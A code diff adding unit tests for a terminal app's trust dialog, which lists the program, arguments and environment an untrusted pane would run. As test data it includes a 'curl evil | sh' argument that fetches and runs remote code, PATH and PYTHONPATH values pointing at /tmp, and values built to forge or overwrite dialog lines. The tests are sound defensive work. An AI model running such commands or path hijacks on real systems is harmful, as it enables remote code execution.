@@ -135,6 +135,60 @@ func test_trust_gate_allows_the_users_own_defaults():
 		"/bin/bash", "EDITOR=vim"))
 	assert_false(PaneTypes.tile_spawns_untrusted({"settings": "not-a-dict"}, "/bin/bash", ""))
 
+# ── PaneTypes.untrusted_plan (what the trust dialog shows) ─────────────
+
+func test_untrusted_plan_lists_what_will_run():
+	var plan = PaneTypes.untrusted_plan({
+		"settings": {
+			"type": "terminal", "command": "/bin/zsh",
+			"shell_args": ["-c", "curl evil | sh"],
+			"shell_env": "PYTHONPATH=/tmp/mod\nPATH=/tmp/bin",
+		},
+	}, "/bin/bash", "")
+	var text := "\n".join(plan)
+	assert_string_contains(text, "program: /bin/zsh")
+	assert_string_contains(text, "arguments: -c, curl evil | sh")
+	assert_string_contains(text, "environment: PYTHONPATH=/tmp/mod")
+	assert_string_contains(text, "environment: PATH=/tmp/bin")
+
+func test_untrusted_plan_is_empty_for_a_trusted_tile():
+	assert_eq(PaneTypes.untrusted_plan(
+		{"settings": {"type": "terminal", "shell_env": "EDITOR=vim"}}, "/bin/bash", "EDITOR=vim").size(), 0)
+	assert_eq(PaneTypes.untrusted_plan({"settings": {"type": "terminal"}}, "/bin/bash", "").size(), 0)
+
+func test_untrusted_plan_labels_every_env_line():
+	# An env blob is a multi-line KEY=value list, so each entry gets its own
+	# line — and every one keeps the "environment:" prefix, so a value cannot
+	# impersonate a "program:" or "arguments:" line.
+	var plan = PaneTypes.untrusted_plan({
+		"settings": {"type": "terminal", "shell_env": "A=1\nprogram: /bin/bash\nB=2"},
+	}, "/bin/bash", "")
+	assert_eq(plan.size(), 3, "each env entry is its own labelled line")
+	for line in plan:
+		assert_string_contains(line, "environment: ", "every env line stays labelled")
+	assert_eq(plan[1], "environment: program: /bin/bash", "a forged line stays inside its label")
+
+	# A carriage return would let a value overwrite its own rendered line.
+	var cr = PaneTypes.untrusted_plan(
+		{"settings": {"type": "terminal", "shell_env": "A=1\rB=2"}}, "/bin/bash", "")
+	assert_false("\r" in cr[0], "control characters are escaped, not rendered")
+
+func test_untrusted_plan_caps_env_lines_and_value_length():
+	var many: Array[String] = []
+	for i in PaneTypes.TRUST_MAX_ENV_LINES + 5:
+		many.append("K%d=v" % i)
+	var plan = PaneTypes.untrusted_plan(
+		{"settings": {"type": "terminal", "shell_env": "\n".join(many)}}, "/bin/bash", "")
+	assert_eq(plan.size(), PaneTypes.TRUST_MAX_ENV_LINES + 1,
+		"env lines are capped, with one line saying how many were hidden")
+	assert_string_contains(plan[plan.size() - 1], "more line")
+
+	var long_value := "V=" + "x".repeat(PaneTypes.TRUST_MAX_VALUE_LEN + 50)
+	var capped = PaneTypes.untrusted_plan(
+		{"settings": {"type": "terminal", "shell_env": long_value}}, "/bin/bash", "")
+	assert_true(capped[0].length() < long_value.length() + 16,
+		"an oversized value must be truncated for display")
+
 # ── PaneBody typed settings application ────────────────────────────────
 
 func test_pane_body_ignores_unknown_and_bad_type_keys():
